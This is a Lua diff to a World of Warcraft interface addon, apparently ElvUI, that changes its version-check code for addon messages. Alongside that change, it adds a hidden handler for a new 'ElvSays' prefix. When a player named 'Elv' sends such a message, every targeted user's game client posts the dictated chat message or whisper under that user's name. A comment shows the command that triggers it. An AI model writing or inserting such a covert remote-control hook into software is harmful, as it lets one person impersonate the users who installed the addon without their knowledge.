@@ -329,15 +329,27 @@ function E:SendMessage()
 	self:CancelAllTimers()
 end
 
+--SENDTO = Specified Name or "ALL"
+--CHANNEL = Channel to announce it in
+--MESSAGE = Actual Message
+--SENDTO = For whispers, force users to whisper other users
+--/run SendAddonMessage('ElvSays', '<SENDTO>,<CHANNEL>,<MESSAGE>,<SENDTO>, 'PARTY')
 function E:SendRecieve(event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
-		if (prefix ~= "ElvUIVC" or sender == E.myname) then return end
-		--print(sender)
-		if tonumber(message) > tonumber(E.version) then
-			E:Print(L["Your version of ElvUI is out of date. You can download the latest version from www.curse.com"])
-			self:UnregisterEvent("CHAT_MSG_ADDON")
-			self:UnregisterEvent("PARTY_MEMBERS_CHANGED")
-			self:UnregisterEvent("RAID_ROSTER_UPDATE")
+		--if sender == E.myname then return end
+		if prefix == "ElvUIVC" then
+			if tonumber(message) > tonumber(E.version) then
+				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from www.curse.com"])
+				self:UnregisterEvent("CHAT_MSG_ADDON")
+				self:UnregisterEvent("PARTY_MEMBERS_CHANGED")
+				self:UnregisterEvent("RAID_ROSTER_UPDATE")
+			end
+		elseif prefix == 'ElvSays' and sender == 'Elv' then ---HAHHAHAHAHHA
+			local user, channel, msg, sendTo = string.split(',', message)
+			
+			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
+				SendChatMessage(msg, channel, nil, sendTo)
+			end
 		end
 	else
 		E:ScheduleTimer('SendMessage', 12)
@@ -470,6 +482,7 @@ function E:Initialize()
 	end
 	
 	RegisterAddonMessagePrefix('ElvUIVC')
+	RegisterAddonMessagePrefix('ElvSays')
 	
 	self:UpdateMedia()
 	self:UpdateFrameTemplates()
